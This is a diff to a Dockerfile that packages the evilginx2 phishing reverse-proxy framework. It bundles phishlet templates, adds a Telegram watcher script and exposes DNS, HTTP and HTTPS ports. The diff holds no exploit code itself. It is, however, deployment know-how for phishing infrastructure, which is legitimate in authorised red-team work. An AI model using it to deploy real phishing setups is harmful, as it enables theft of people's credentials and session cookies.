@@ -6,27 +6,32 @@ RUN apk add --no-cache git make gcc musl-dev
 WORKDIR /src
 COPY . .
 
-RUN go build -o /usr/local/bin/evilginx .
+# evilginx2 originally predates Go modules - initialize if needed
+RUN go mod init github.com/afrikaquality/evilginx2 2>/dev/null || true
+RUN go mod tidy
+RUN CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /usr/local/bin/evilginx .
 
 # ---------- Runtime stage ----------
 FROM alpine:3.19
 
-RUN apk add --no-cache ca-certificates tzdata bash
+RUN apk add --no-cache ca-certificates tzdata bash curl su-exec libcap
 
-# Create the app user (avoid running as root when possible)
+# Non-root app user
 RUN addgroup -S evilginx && adduser -S evilginx -G evilginx
 
 COPY --from=builder /usr/local/bin/evilginx /usr/local/bin/evilginx
+COPY --from=builder /src/phishlets /usr/local/share/evilginx/phishlets
 COPY entrypoint.sh /entrypoint.sh
-RUN chmod +x /entrypoint.sh
+COPY telegram-watch.sh /usr/local/bin/telegram-watch.sh
+RUN chmod +x /entrypoint.sh /usr/local/bin/telegram-watch.sh && \
+    setcap cap_net_bind_service=+ep /usr/local/bin/evilginx
 
-# Evilginx writes phishlets/, sessions/, certs/ relative to WORKDIR
 WORKDIR /app
 RUN mkdir -p /app/phishlets /app/sessions /app/certs && \
     chown -R evilginx:evilginx /app
 
-USER evilginx
-
-EXPOSE 53/udp 80/tcp 443/tcp
+# NOTE: no USER directive here - the entrypoint starts as root
+# (to fix volume ownership), then drops to 'evilginx' via su-exec.
+EXPOSE 53/udp 53/tcp 80/tcp 443/tcp
 
 ENTRYPOINT ["/entrypoint.sh"]
